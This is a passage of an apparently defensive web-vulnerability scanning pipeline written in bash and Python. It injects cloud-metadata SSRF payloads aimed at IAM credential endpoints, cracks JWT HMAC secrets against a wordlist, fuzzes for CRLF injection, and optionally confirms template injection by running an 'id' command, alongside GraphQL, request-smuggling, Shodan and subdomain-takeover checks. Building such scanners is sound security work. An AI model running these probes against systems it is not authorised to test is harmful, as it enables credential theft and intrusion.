    # ── Phase 5: Cloud metadata direct probe (non-OOB) ──
    META_PAYLOADS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    ]
    meta_hosts = set()
    for line in open(urls_file, errors="ignore"):
        u = line.strip()
        if not u or sent >= CAP:
            break
        try:
            parts = urllib.parse.urlsplit(u)
            qs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
        except Exception:
            continue
        if parts.netloc in meta_hosts or not qs:
            continue
        meta_hosts.add(parts.netloc)
        for i, (k, v) in enumerate(qs):
            kl = k.lower()
            if kl not in SINKS and not URL_VALUE_RX.match(v):
                continue
            for mp in META_PAYLOADS:
                if sent >= CAP:
                    break
                token = mktok()
                newqs = qs[:i] + [(k, mp)] + qs[i+1:]
                probe_url = urllib.parse.urlunsplit((
                    parts.scheme, parts.netloc, parts.path,
                    urllib.parse.urlencode(newqs), parts.fragment))
                record(mf, token, u, k + "→meta", parts.netloc, "cloud-metadata")
                body = fire(probe_url)
                check_metadata_leak(body, u, k, parts.netloc, "cloud-metadata")
                sent += 1
                time.sleep(delay)
            break

# Write direct findings (metadata leaks confirmed from response content)
if direct_findings and direct_out:
    with open(direct_out, "a") as df:
        for f in direct_findings:
            df.write(json.dumps(f) + "\n")

print(sent)
SSRFEOF
    log_info "  SSRF probes sent (awaiting OOB callbacks)"
}

# CRLF injection — crlfuzz detection mode. SAFE: detects header-injection
# reflection; does not chain to XSS/cache poisoning.
_ext_crlf() {
    local urls="$1" out="$2"
    : > "$out"
    [ "$CHECK_CRLF" = "true" ] || { log_info "  CRLF check disabled"; return 0; }
    command -v "$CRLFUZZ" &>/dev/null || { log_warn "  crlfuzz not installed; skipping CRLF"; return 0; }
    # crlfuzz injects into HTTP headers, so it works on ANY URL, not just
    # parameterized ones. Use the full URL list for broader coverage.
    local crlf_urls="$urls"
    if [ -f "${urls%.txt}_all.txt" ] && [ -s "${urls%.txt}_all.txt" ]; then
        crlf_urls="${urls%.txt}_all.txt"
    fi
    [ -s "$crlf_urls" ] || return 0
    "$CRLFUZZ" -l "$crlf_urls" -s -c 25 -o "$out.raw" 2>/dev/null || true
    if [ -f "$out.raw" ]; then
        while IFS= read -r line; do
            [ -z "$line" ] && continue
            local host; host=$(printf '%s' "$line" | awk -F/ '{print $3}')
            jq -cn --arg url "$line" --arg host "$host" \
                '{check:"crlf",tool:"crlfuzz",severity:"medium",template:"CRLF header injection",
                  host:$host,url:$url,parameter:"",evidence:"CRLF payload reflected into response headers",
                  confidence:"confirmed",verification:"response-reflection",
                  remediation:"URL-encode CR/LF in header-reflected values; validate redirect/location inputs.",safe_mode:true}' >> "$out"
        done < "$out.raw"
    fi
    log_info "  CRLF findings: $(count_lines "$out")"
}

# JWT weaknesses — 100% OFFLINE. SAFEST check: extracts tokens from crawled
# responses/JS and analyzes them locally. No requests to production, no forged
# tokens sent, so no possibility of auth bypass.
_ext_jwt() {
    local out="$1"
    : > "$out"
    [ "$CHECK_JWT" = "true" ] || { log_info "  JWT check disabled"; return 0; }
    local resp_dir="$OUTPUT_DIR/04_http_discovery/responses"
    local js_dir="$OUTPUT_DIR/09_crawling/js_downloads"
    local wordlist="$HOME/recon/lists/jwt-secrets.txt"
    [ -f "$wordlist" ] || wordlist=""
    python3 - "$out" "$resp_dir" "$js_dir" "$wordlist" << 'JWTEOF'
import sys, os, re, json, base64, hmac, hashlib
out, resp_dir, js_dir, wordlist = sys.argv[1:5]
JWT_RX = re.compile(r'eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{0,}')
COMMON = ["secret","password","123456","changeme","admin","key","jwt","token","private",
          "secretkey","supersecret","qwerty","test","dev","default","your-256-bit-secret",
          "your_jwt_secret","jwtsecret","s3cr3t","P@ssw0rd"]
def b64d(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s.encode())
def scan_files(root):
    toks = set()
    if not os.path.isdir(root):
        return toks
    for r,_,files in os.walk(root):
        for fn in files:
            try:
                data = open(os.path.join(r,fn), errors="ignore").read()
            except Exception:
                continue
            for m in JWT_RX.findall(data):
                toks.add(m)
    return toks
tokens = scan_files(resp_dir) | scan_files(js_dir)
words = COMMON[:]
if wordlist and os.path.exists(wordlist):
    words += [w.strip() for w in open(wordlist, errors="ignore") if w.strip()][:5000]
seen = set()
with open(out, "w") as w:
    for tok in tokens:
        parts = tok.split(".")
        if len(parts) < 2:
            continue
        try:
            hdr = json.loads(b64d(parts[0]))
        except Exception:
            continue
        alg = str(hdr.get("alg","")).lower()
        try:
            payload = json.loads(b64d(parts[1])) if len(parts) > 1 else {}
        except Exception:
            payload = {}
        fp = (parts[0], parts[1][:16])
        if fp in seen:
            continue
        seen.add(fp)
        issues, sev = [], "info"
        if alg == "none":
            issues.append("alg:none — signature not enforced"); sev = "high"
        # Offline HMAC secret crack (no network).
        cracked = None
        if alg in ("hs256","hs384","hs512") and len(parts) == 3:
            digestmod = {"hs256":hashlib.sha256,"hs384":hashlib.sha384,"hs512":hashlib.sha512}[alg]
            signing_input = (parts[0] + "." + parts[1]).encode()
            try:
                sig = b64d(parts[2])
                for cand in words:
                    if hmac.compare_digest(hmac.new(cand.encode(), signing_input, digestmod).digest(), sig):
                        cracked = cand; break
            except Exception:
                pass
            if cracked:
                issues.append("weak HMAC secret cracked offline: '%s'" % cracked); sev = "critical"
        sensitive = [k for k in payload if k.lower() in ("role","roles","admin","is_admin","scope","permissions","email","user","uid")]
        if sensitive and not issues:
            issues.append("carries privileged claims: %s" % ", ".join(sensitive[:5])); sev = "low"
        if not issues:
            continue
        host = ""
        for c in ("iss","aud"):
            if isinstance(payload.get(c), str) and "//" in payload[c]:
                host = payload[c].split("//")[1].split("/")[0]; break
        w.write(json.dumps({
            "check":"jwt","tool":"jwt_tool","severity":sev,
            "template":"JWT weakness (%s)" % alg.upper(),
            "host":host or "token", "url":"", "parameter":"Authorization",
            "evidence":"; ".join(issues),
            "confidence":"confirmed","verification":"offline-analysis",
            "remediation":"Use a strong random secret / asymmetric keys; reject alg:none; validate signature server-side.",
            "safe_mode":True}) + "\n")
JWTEOF
    log_info "  JWT findings: $(count_lines "$out")"
}

# SSTI — SSTImap. Safe mode (default): detection only, arithmetic marker payloads
# to identify a vulnerable engine; no code execution. Aggressive mode
# (EXTENDED_SAFE_MODE=false): confirms with a single benign `id` OS command (-S);
# never an interactive shell (-s/-x) or destructive command.
_ext_ssti() {
    local urls="$1" out="$2"
    : > "$out"
    [ "$CHECK_SSTI" = "true" ] || { log_info "  SSTI check disabled"; return 0; }
    command -v "$SSTIMAP" &>/dev/null || { log_warn "  sstimap not installed; skipping SSTI"; return 0; }
    [ -s "$urls" ] || return 0

    local st_safe=true
    local st_exploit_args=()
    if [ "$EXTENDED_SAFE_MODE" = "false" ]; then
        st_exploit_args=(-S id)
        st_safe=false
    fi

    local ssti_timeout="${SSTI_TIMEOUT:-180}"

    # Phase 1: Batch scan via --load-urls (much faster than one-at-a-time)
    local batch_out="$out.batch"
    local -a batch_args=(--load-urls "$urls" --forms --empty-forms -l 2)
    [ ${#st_exploit_args[@]} -gt 0 ] && batch_args+=("${st_exploit_args[@]}")
    local batch_res; batch_res=$(_arise_run_with_timeout "$ssti_timeout" "$SSTIMAP" "${batch_args[@]}" 2>/dev/null || true)

    # Phase 2: Parse batch output. If batch mode isn't supported, fall back to per-URL.
    if printf '%s' "$batch_res" | grep -qiE 'identified the following|is vulnerable|template injection'; then
        _ext_ssti_parse_output "$batch_res" "$out" "$st_safe"
    else
        # Fallback: per-URL scanning (handles older sstimap versions)
        local n=0
        while IFS= read -r u && [ $n -lt 80 ]; do
            [ -z "$u" ] && continue
            n=$((n+1))
            local -a st_args=(-u "$u" --forms --empty-forms)
            [ ${#st_exploit_args[@]} -gt 0 ] && st_args+=("${st_exploit_args[@]}")
            local res; res=$(_arise_run_with_timeout 60 "$SSTIMAP" "${st_args[@]}" 2>/dev/null || true)
            if printf '%s' "$res" | grep -qiE 'identified the following|is vulnerable|template injection'; then
                _ext_ssti_parse_output "$res" "$out" "$st_safe"
            fi
        done < "$urls"
    fi

    # Phase 3: Also test the broader URL list (non-parameterized pages with forms)
    local all_urls="${urls%.txt}_all.txt"
    if [ -f "$all_urls" ] && [ -s "$all_urls" ]; then
        local n2=0
        while IFS= read -r u && [ $n2 -lt 40 ]; do
            [ -z "$u" ] && continue
            # Skip if already tested via param_urls
            grep -qF "$u" "$urls" 2>/dev/null && continue
            n2=$((n2+1))
            local -a st_args=(-u "$u" --forms --empty-forms -c 1)
            [ ${#st_exploit_args[@]} -gt 0 ] && st_args+=("${st_exploit_args[@]}")
            local res; res=$(_arise_run_with_timeout 60 "$SSTIMAP" "${st_args[@]}" 2>/dev/null || true)
            if printf '%s' "$res" | grep -qiE 'identified the following|is vulnerable|template injection'; then
                _ext_ssti_parse_output "$res" "$out" "$st_safe"
            fi
        done < "$all_urls"
    fi

    log_info "  SSTI findings: $(count_lines "$out")"
}

_ext_ssti_parse_output() {
    local res="$1" out="$2" st_safe="$3"
    local url_from_output engine sev conf verif evid
    # SSTImap outputs lines like: "[+] ... identified the following injection point"
    # and "URL: http://...", "Engine: Jinja2"
    engine=$(printf '%s' "$res" | grep -oiE '(engine|template):\s*[A-Za-z0-9_.]+' | head -1 | awk -F'[: ]+' '{print $NF}')
    [ -z "$engine" ] && engine="unknown"
    url_from_output=$(printf '%s' "$res" | grep -oiE 'https?://[^ ]+' | head -1)
    [ -z "$url_from_output" ] && url_from_output="unknown"
    local host; host=$(printf '%s' "$url_from_output" | awk -F/ '{print $3}')
    [ -z "$host" ] && host="unknown"
    sev="high"; conf="probable"; verif="expression-eval"
    evid="template engine $engine reflects injected expression"
    if [ "$st_safe" = "false" ] && printf '%s' "$res" | grep -qiE 'uid=[0-9]+.*gid=[0-9]+'; then
        sev="critical"; conf="confirmed"; verif="os-command-exec"
        evid="RCE confirmed via SSTI: 'id' executed in ${engine} engine"
    fi
    jq -cn --arg url "$url_from_output" --arg host "$host" --arg eng "$engine" \
        --arg sev "$sev" --arg conf "$conf" --arg verif "$verif" \
        --arg evid "$evid" --argjson safe "$st_safe" \
        '{check:"ssti",tool:"sstimap",severity:$sev,template:("SSTI ("+$eng+")"),
          host:$host,url:$url,parameter:"",evidence:$evid,
          confidence:$conf,verification:$verif,
          remediation:"Never render user input as a template; use logic-less templates or strict sandboxing.",safe_mode:$safe}' >> "$out"
}

# GraphQL — graphw00f fingerprint + introspection check. SAFE: read-only
# detection queries; no mutations.
_ext_graphql() {
    local out="$1"
    : > "$out"
    [ "$CHECK_GRAPHQL" = "true" ] || { log_info "  GraphQL check disabled"; return 0; }
    command -v "$GRAPHW00F" &>/dev/null || { log_warn "  graphw00f not installed; skipping GraphQL"; return 0; }
    # Candidate endpoints: known paths on each confirmed web host.
    local hosts_file="$OUTPUT_DIR/04_http_discovery/http_hosts.txt"
    [ -s "$hosts_file" ] || return 0
    local paths=("/graphql" "/graphql/console" "/api/graphql" "/v1/graphql" "/query" "/gql")
    local n=0
    while IFS= read -r base && [ $n -lt 40 ]; do
        base="${base%/}"
        for p in "${paths[@]}"; do
            n=$((n+1))
            local ep="$base$p"
            local res; res=$(_arise_run_with_timeout "${GRAPHQL_PER_URL_TIMEOUT:-15}" "$GRAPHW00F" -d -t "$ep" 2>/dev/null || true)
            if printf '%s' "$res" | grep -qiE 'Discovered GraphQL Engine|Attack Surface|seems to be running'; then
                local engine; engine=$(printf '%s' "$res" | grep -oiE 'Engine: [A-Za-z0-9_.-]+' | head -1 | cut -d' ' -f2)
                [ -z "$engine" ] && engine="unknown"
                local introspect="unknown"
                printf '%s' "$res" | grep -qiE 'introspection.*enabled|Introspection is enabled' && introspect="enabled"
                local sev="info"; [ "$introspect" = "enabled" ] && sev="medium"
                local host; host=$(printf '%s' "$ep" | awk -F/ '{print $3}')
                jq -cn --arg url "$ep" --arg host "$host" --arg eng "$engine" --arg intro "$introspect" --arg sev "$sev" \
                    '{check:"graphql",tool:"graphw00f",severity:$sev,template:("GraphQL endpoint ("+$eng+")"),
                      host:$host,url:$url,parameter:"",evidence:("GraphQL engine "+$eng+", introspection "+$intro),
                      confidence:"informational",verification:"fingerprint",
                      remediation:"Disable introspection in production; enforce query depth/cost limits and authz per field.",safe_mode:true}' >> "$out"
                break
            fi
        done
    done < "$hosts_file"
    log_info "  GraphQL findings: $(count_lines "$out")"
}

# HTTP request smuggling — GATED OFF. Desync probes can corrupt other users'
# in-flight requests on shared production frontends, so this only runs when the
# operator explicitly opts in.
_ext_smuggling() {
    local out="$1"
    : > "$out"
    if [ "$CHECK_SMUGGLING" != "true" ]; then
        log_info "  Smuggling check disabled (CHECK_SMUGGLING=false) — production-safe default"
        return 0
    fi
    command -v "$SMUGGLER" &>/dev/null || { log_warn "  smuggler not installed; skipping"; return 0; }
    local hosts_file="$OUTPUT_DIR/04_http_discovery/http_hosts.txt"
    [ -s "$hosts_file" ] || return 0
    log_warn "  Running HTTP smuggling detection (opt-in) — timing-based probes only"
    local n=0
    while IFS= read -r u && [ $n -lt 20 ]; do
        [ -z "$u" ] && continue
        n=$((n+1))
        local res; res=$("$SMUGGLER" -u "$u" -q --timeout 6 2>/dev/null || true)
        if printf '%s' "$res" | grep -qiE 'POTENTIALLY VULNERABLE|CL\.TE|TE\.CL'; then
            local host; host=$(printf '%s' "$u" | awk -F/ '{print $3}')
            local variant; variant=$(printf '%s' "$res" | grep -oiE 'CL\.TE|TE\.CL|TE\.TE' | head -1)
            jq -cn --arg url "$u" --arg host "$host" --arg var "$variant" \
                '{check:"smuggling",tool:"smuggler",severity:"high",template:("HTTP request smuggling ("+$var+")"),
                  host:$host,url:$url,parameter:"",evidence:("desync timing signature: "+$var),
                  confidence:"probable",verification:"timing-differential",
                  remediation:"Normalize Content-Length/Transfer-Encoding at the edge; reject ambiguous framing; use HTTP/2 end-to-end.",safe_mode:true}' >> "$out"
        fi
    done < "$hosts_file"
    log_info "  Smuggling findings: $(count_lines "$out")"
}

# Correlate interactsh callbacks back to the SSRF probe that triggered them.
_ext_ssrf_correlate() {
    local callbacks="$1" probe_map="$2" out="$3"
    : > "$out"
    [ -f "$callbacks" ] || return 0
    python3 - "$callbacks" "$probe_map" "$out" << 'CORREOF'
import sys, json
cb, mapfile, out = sys.argv[1:4]
probes = {}
try:
    for line in open(mapfile, errors="ignore"):
        line=line.strip()
        if line:
            d=json.loads(line); probes[d["token"]]=d
except Exception:
    pass

VECTOR_INFO = {
    "query-param":      ("Blind SSRF via query parameter (OOB confirmed)", "high",
                         "server fetched an injected URL from query parameter '{param}' — out-of-band {proto} callback confirmed"),
    "post-body-json":   ("Blind SSRF via POST body injection (OOB confirmed)", "high",
                         "server fetched an injected URL from JSON body key '{param}' — out-of-band {proto} callback confirmed"),
    "header-xff":       ("Blind SSRF via X-Forwarded-For header (OOB confirmed)", "high",
                         "server made outbound request from X-Forwarded-For header injection — out-of-band {proto} callback confirmed"),
    "header-xou":       ("Blind SSRF via X-Original-URL header (OOB confirmed)", "high",
                         "server fetched X-Original-URL header value — out-of-band {proto} callback confirmed"),
    "header-referer":   ("Blind SSRF via Referer header (OOB confirmed)", "medium",
                         "server fetched Referer header value — out-of-band {proto} callback confirmed; may be analytics/logging SSRF"),
    "header-xfh":       ("Blind SSRF via X-Forwarded-Host header (OOB confirmed)", "high",
                         "server resolved X-Forwarded-Host to an injected domain — out-of-band {proto} callback confirmed"),
    "path-proxy":       ("Blind SSRF via proxy endpoint (OOB confirmed)", "critical",
                         "proxy/fetch endpoint forwarded request to injected URL — out-of-band {proto} callback confirmed; likely open proxy"),
    "cloud-metadata":   ("SSRF cloud metadata probe (OOB confirmed)", "critical",
                         "server fetched cloud metadata payload and made out-of-band {proto} callback — metadata endpoint may be reachable"),
}

hit = {}
for line in open(cb, errors="ignore"):
    line=line.strip()
    if not line:
        continue
    try:
        rec=json.loads(line)
    except Exception:
        continue
    fqdn=(rec.get("full-id") or rec.get("unique-id") or rec.get("full_id") or "").lower()
    raw=json.dumps(rec).lower()
    proto=rec.get("protocol","dns")
    for token, meta in probes.items():
        if token in fqdn or token in raw:
            key=(token,)
            if key in hit:
                continue
            hit[key]=True
            vec = meta.get("vector", "query-param")
            info = VECTOR_INFO.get(vec, VECTOR_INFO["query-param"])
            template, severity, evidence_tpl = info
            evidence = evidence_tpl.format(param=meta.get("param",""), proto=proto)
            with open(out,"a") as w:
                w.write(json.dumps({
                    "check":"ssrf","tool":"interactsh","severity":severity,
                    "template":template,
                    "host":meta.get("host",""),"url":meta.get("url",""),
                    "parameter":meta.get("param",""),
                    "vector":vec,
                    "evidence":evidence,
                    "confidence":"confirmed","verification":"oob-callback",
                    "remediation":"Validate/allowlist outbound URLs; block link-local & metadata ranges (169.254.169.254); enforce IMDSv2; restrict proxy endpoints.",
                    "safe_mode":True})+"\n")
CORREOF
    log_info "  SSRF confirmed (OOB): $(count_lines "$out")"
}

###################################################################################################
# MODULE 22: SHODAN CORRELATION (intel/shodan_correlation.py)
#
# Passive external-view enrichment. Reconciles ARISE's own observed view
# (resolved IPs, open ports, fingerprinted services, WAF map) against Shodan's
# cached external view of the same ORIGIN IPs. CDN/WAF edge IPs are excluded
# from every lookup (the project's skip-WAF/CDN rule) so we never enrich shared
# CDN infrastructure. Emits a per-asset correlation matrix, coverage gaps, and
# port/product/CVE findings (CWE + CAPEC + ATT&CK) for the dashboard's Shodan
# Correlation tab (Module 22). Fully passive and stdlib-only; guarded so it can
# never fail the pipeline — with no network / no API key it degrades to a
# local-only matrix. Runs AFTER service_fingerprint so every join input exists.
#   Env: SHODAN_API_KEY (richer banners), SHODAN_CORR_NO_NET=true (offline),
#        SHODAN_INTERNETDB=false (disable free fallback).
###################################################################################################
module_shodan_correlation() {
    local target="$1"
    log_section "MODULE 22: Shodan Correlation (external-view enrichment)"

    local start_time=$(date +%s)
    local base_dir="$OUTPUT_DIR/22_shodan_correlation"
    mkdir -p "$base_dir"
    local output_file="$base_dir/$(make_iso_filename "$target" "shodan_correlation" "results")"

    local engine="$PROJECT_ROOT/intel/shodan_correlation.py"
    [ ! -f "$engine" ] && engine="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/intel/shodan_correlation.py"

    local findings_total=0
    local _status="completed"

    if [ -f "$engine" ] && command -v python3 &>/dev/null; then
        log_info "Correlating origin IPs against Shodan (InternetDB/API) — CDN/WAF IPs excluded..."
        python3 "$engine" "$OUTPUT_DIR" --domain "$target" \
            >> "$base_dir/shodan_correlation.log" 2>&1 || {
            _status="partial"
            log_warn "intel/shodan_correlation.py returned non-zero; continuing"
        }
        if [ -s "$base_dir/shodan_summary.json" ]; then
            findings_total=$(python3 -c "import json;print(json.load(open('$base_dir/shodan_summary.json')).get('total_findings',0))" 2>/dev/null || echo 0)
            local _score=$(python3 -c "import json;print(json.load(open('$base_dir/shodan_summary.json')).get('exposure_score',0))" 2>/dev/null || echo 0)
            local _src=$(python3 -c "import json;print(json.load(open('$base_dir/shodan_summary.json')).get('shodan_source','?'))" 2>/dev/null || echo '?')
            log_info "Shodan correlation: $findings_total findings, exposure score $_score (source=$_src)"
        fi
    else
        _status="skipped"
        log_warn "intel/shodan_correlation.py not found or python3 missing — skipping Shodan correlation"
    fi

    update_statistics "shodan_findings" "$findings_total"

    local end_time=$(date +%s)
    cat > "$output_file" << EOF
{
  "module": "shodan_correlation",
  "status": "$_status",
  "total_findings": $findings_total,
  "duration_seconds": $((end_time - start_time))
}
EOF
    log_info "Module 22 (Shodan Correlation) completed in $((end_time - start_time))s"
    echo "$output_file"
    return 0
}

###################################################################################################
module_internet_intel() {
    local target="$1"
    log_section "MODULE 23: Internet Intelligence Layer (consolidated enrichment)"

    local start_time=$(date +%s)
    local base_dir="$OUTPUT_DIR/23_internet_intel"
    mkdir -p "$base_dir"
    local output_file="$base_dir/$(make_iso_filename "$target" "internet_intel" "results")"

    local engine="$PROJECT_ROOT/intel/internet_intel.py"
    [ ! -f "$engine" ] && engine="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/intel/internet_intel.py"

    local findings_total=0
    local _status="completed"

    if [ -f "$engine" ] && command -v python3 &>/dev/null; then
        log_info "Consolidating all module outputs + Censys/GreyNoise enrichment..."
        python3 "$engine" "$OUTPUT_DIR" --domain "$target" \
            >> "$base_dir/internet_intel.log" 2>&1 || {
            _status="partial"
            log_warn "intel/internet_intel.py returned non-zero; continuing"
        }
        if [ -s "$base_dir/intel_summary.json" ]; then
            findings_total=$(python3 -c "import json;print(json.load(open('$base_dir/intel_summary.json')).get('total_findings',0))" 2>/dev/null || echo 0)
            local _assets=$(python3 -c "import json;print(json.load(open('$base_dir/intel_summary.json')).get('total_assets',0))" 2>/dev/null || echo 0)
            local _risk=$(python3 -c "import json;print(json.load(open('$base_dir/intel_summary.json')).get('risk_score',0))" 2>/dev/null || echo 0)
            log_info "Internet Intel: $_assets assets, $findings_total findings, risk=$_risk"
        fi
    else
        _status="skipped"
        log_warn "intel/internet_intel.py not found or python3 missing — skipping Internet Intelligence Layer"
    fi

    update_statistics "internet_intel_findings" "$findings_total"

    local end_time=$(date +%s)
    cat > "$output_file" << EOF
{
  "module": "internet_intel",
  "status": "$_status",
  "total_findings": $findings_total,
  "duration_seconds": $((end_time - start_time))
}
EOF
    log_info "Module 23 (Internet Intelligence Layer) completed in $((end_time - start_time))s"
    echo "$output_file"
    return 0
}

module_osint_intel() {
    local target="$1"
    log_section "MODULE 18: OSINT & Human Exposure Intelligence"

    local start_time=$(date +%s)
    local base_dir="$OUTPUT_DIR/18_osint_intel"
    mkdir -p "$base_dir"
    local output_file="$base_dir/$(make_iso_filename "$target" "osint_intel" "results")"

    local osint_engine="$PROJECT_ROOT/intel/osint_intel.py"
    [ ! -f "$osint_engine" ] && osint_engine="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/intel/osint_intel.py"

    local osint_total=0
    local _osint_status="completed"

    if [ -f "$osint_engine" ] && command -v python3 &>/dev/null; then
        log_info "Collecting OSINT: brand/typosquat, CT logs, supply chain, internet exposure, breach & code exposure..."
        python3 "$osint_engine" "$OUTPUT_DIR" --domain "$target" \
            >> "$base_dir/osint_intel.log" 2>&1 || {
            _osint_status="partial"
            log_warn "intel/osint_intel.py returned non-zero; continuing"
        }
        if [ -s "$base_dir/osint_summary.json" ]; then
            osint_total=$(python3 -c "import json,sys;print(json.load(open('$base_dir/osint_summary.json')).get('total',0))" 2>/dev/null || echo 0)
            log_info "OSINT findings: $osint_total (see 18_osint_intel/osint_summary.json)"
        fi
    else
        _osint_status="skipped"
        log_warn "intel/osint_intel.py not found or python3 missing — skipping OSINT phase"
    fi

    update_statistics "osint_findings" "$osint_total"

    local end_time=$(date +%s)
    cat > "$output_file" << EOF
{
  "module": "osint_intel",
  "status": "$_osint_status",
  "total_findings": $osint_total,
  "duration_seconds": $((end_time - start_time))
}
EOF
    log_info "Module 18 (OSINT) completed in $((end_time - start_time))s"
    echo "$output_file"
}

###################################################################################################
# MODULE 21: SUBDOMAIN TAKEOVER DETECTION (subjack)
#
# Runs subjack (github.com/haccer/subjack) against all DNS-resolved subdomains
# to detect dangling CNAME records that point to unclaimed cloud services
# (S3, Heroku, GitHub Pages, Shopify, Azure, etc.). Each confirmed takeover
# candidate is written as a JSONL finding that feeds both the Vulnerabilities
# table and the DNS tab's Subdomain Takeover panel.
###################################################################################################

SUBJACK_BIN="${SUBJACK_BIN:-subjack}"
SUBJACK_THREADS="${SUBJACK_THREADS:-20}"
SUBJACK_TIMEOUT="${SUBJACK_TIMEOUT:-10}"
SUBJACK_SSL="${SUBJACK_SSL:-true}"

module_subdomain_takeover() {
    local target="$1"
    log_section "MODULE 21: Subdomain Takeover Detection (subjack)"

    local start_time=$(date +%s)
    local base_dir="$OUTPUT_DIR/21_subdomain_takeover"
    mkdir -p "$base_dir"
    local output_file="$base_dir/$(make_iso_filename "$target" "subdomain_takeover" "results")"
    local findings_file="$base_dir/takeover_findings.jsonl"
    > "$findings_file"

    # Require subjack
    if ! command -v "$SUBJACK_BIN" &>/dev/null; then
        log_warn "subjack not installed (go install github.com/haccer/subjack@latest) — skipping"
        cat > "$output_file" << EOF
{
  "module": "subdomain_takeover",
  "status": "skipped",
  "reason": "subjack not installed",
  "takeover_count": 0,
  "duration_seconds": 0
}
EOF
        echo "$output_file"
        return 0
    fi

    # Input: DNS-resolved subdomains from Module 3
    local subs_file="$OUTPUT_DIR/03_dns_resolution/resolved.txt"
    if [ ! -s "$subs_file" ]; then
        # Fallback to the raw enumeration list
        subs_file="$OUTPUT_DIR/02_subdomain_enum/all_subdomains.txt"
    fi
    if [ ! -s "$subs_file" ]; then
        log_warn "No subdomains file found — skipping takeover check"
        cat > "$output_file" << EOF
{
  "module": "subdomain_takeover",
  "status": "skipped",
  "reason": "no subdomains",
  "takeover_count": 0,
  "duration_seconds": 0
}
EOF
        echo "$output_file"
        return 0
    fi

    local sub_count
    sub_count=$(count_lines "$subs_file")
    log_info "Checking $sub_count subdomains for takeover via subjack..."

    # NOTE: This subjack fork (the one exposing -ar/-axfr/-mail/-ns) ships
    # embedded service fingerprints and has NO -c flag. Passing -c makes it
    # abort with "flag provided but not defined: -c", killing every pass.
    # Do not reintroduce a -c/fingerprints argument here.

    # -----------------------------------------------------------------------
    # Run all 5 subjack check methods as separate passes so findings are
    # tagged by detection method and split in the output.
    #
    # Method → extra flags:
    #   cname        (default)  dangling CNAME + dead records (-a -m)
    #   stale_a      (-ar)      stale A records pointing to dead IPs
    #   zone_xfer    (-axfr)    zone-transfer attempt + NS bruteforce
    #   mail         (-mail)    SPF include / MX record takeovers
    #   ns           (-ns)      nameservers available for purchase
    # -----------------------------------------------------------------------
    # NOTE: no associative arrays here — the rest of this script targets
    # bash 3.2 (macOS default), which lacks `declare -A`. A case statement
    # maps each method name to its subjack flags.

    local _method_raw_list=""    # "file:method file:method …" for the parser

    for _method in cname stale_a zone_xfer mail ns; do
        local _raw="$base_dir/subjack_${_method}.txt"
        # Map method → extra subjack flags
        local _flags=""
        case "$_method" in
            cname)     _flags="-a -m" ;;
            stale_a)   _flags="-ar" ;;
            zone_xfer) _flags="-axfr" ;;
            mail)      _flags="-mail" ;;
            ns)        _flags="-ns" ;;
        esac
        # shellcheck disable=SC2206
        local _extra=($_flags)
        local _args=( -w "$subs_file" -t "$SUBJACK_THREADS" -timeout "$SUBJACK_TIMEOUT" -o "$_raw" -v "${_extra[@]}" )
        [ "$SUBJACK_SSL" = "true" ] && _args+=( -ssl )

        log_info "subjack [$_method]: ${_extra[*]:-default}"
        # run_tool logs but don't abort on non-zero — partial results are still useful
        "$SUBJACK_BIN" "${_args[@]}" 2>>"$base_dir/subjack_${_method}.log" || true

        if [ -s "$_raw" ]; then
            _method_raw_list="$_method_raw_list $_raw:$_method"
            log_info "  → $(wc -l < "$_raw" | tr -d ' ') lines from [$_method]"
        else
            log_info "  → no findings from [$_method]"
        fi
    done

    # Parse all per-method raw files → single JSONL findings file
    local takeover_count=0
    if [ -n "$_method_raw_list" ]; then
        _SUBJACK_OUT="$findings_file" \
        _SUBJACK_TGT="$target" \
        _SUBJACK_RAWS="$_method_raw_list" \
        python3 - << 'SUBJACK_PARSE'
import json, re, sys, os, ipaddress

findings_file = os.environ['_SUBJACK_OUT']
target        = os.environ['_SUBJACK_TGT']
raw_list_str  = os.environ['_SUBJACK_RAWS']

vuln_re = re.compile(
    r'^\[([^\]]+)\]\s+(\S+)'
    r'(?:\s+-\s+(.*))?',
    re.IGNORECASE
)
skip_labels = {'not vulnerable'}

_IP_RE = re.compile(r'\b(\d{1,3}(?:\.\d{1,3}){3})\b')

def extract_ip(detail):
    m = _IP_RE.search(detail or '')
    return m.group(1) if m else None

def is_unclaimable_ip(ip_str):
    """RFC1918/loopback/link-local/reserved/multicast space cannot be
    'reclaimed' by an external attacker (F35, ARISE_REMEDIATION_ROADMAP.md:
    subjack's stale-A-record check ('-ar', "IP appears dead") only tests
    reachability, never whether the dead IP is even externally routable —
    a private IP is ALWAYS unreachable from the scanner, so it always
    'appears dead' and was always being reported as a takeover candidate)."""
    try:
        ip = ipaddress.ip_address(ip_str)
        return ip.is_private or ip.is_loopback or ip.is_link_local \
            or ip.is_reserved or ip.is_multicast or ip.is_unspecified
    except Exception:
        return False

CRITICAL_SERVICES = {
    's3', 'amazon s3', 'heroku', 'github', 'github pages',
    'shopify', 'azure', 'bitbucket', 'squarespace',
    'fastly', 'pantheon', 'netlify', 'fly.io', 'wordpress',
    'zendesk', 'wix', 'cargo', 'feedpress', 'ghost',
}

METHOD_LABELS = {
    'cname':     'Dangling CNAME',
    'stale_a':   'Stale A Record',
    'zone_xfer': 'Zone Transfer / NS Bruteforce',
    'mail':      'SPF/MX Takeover',
    'ns':        'NS Delegation Takeover',
}

LABEL_TAGS = {
    'ns delegation takeover': ['dns-takeover', 'dangling-ns', 'route53'],
    'stale a record':         ['stale-dns', 'dead-ip', 'dangling-a'],
    'uptimerobot':            ['monitoring-exposed', 'service-leak', 'uptimerobot'],
    'vulnerable':             ['takeover-confirmed', 'claimable'],
    'dead':                   ['dead-service', 'abandoned'],
}

def build_title(label, method, subdomain):
    ll = label.lower()
    if 'ns delegation' in ll:
        return f'Dangling NS Delegation — {subdomain} nameservers point to unclaimed Route53 zone'
    if 'stale a' in ll:
        return f'Stale A Record — {subdomain} resolves to a dead/unresponsive IP'
    if 'uptimerobot' in ll:
        if method == 'cname':
            return f'Dangling CNAME to UptimeRobot — {subdomain} points to unclaimed monitoring page'
        if method == 'mail':
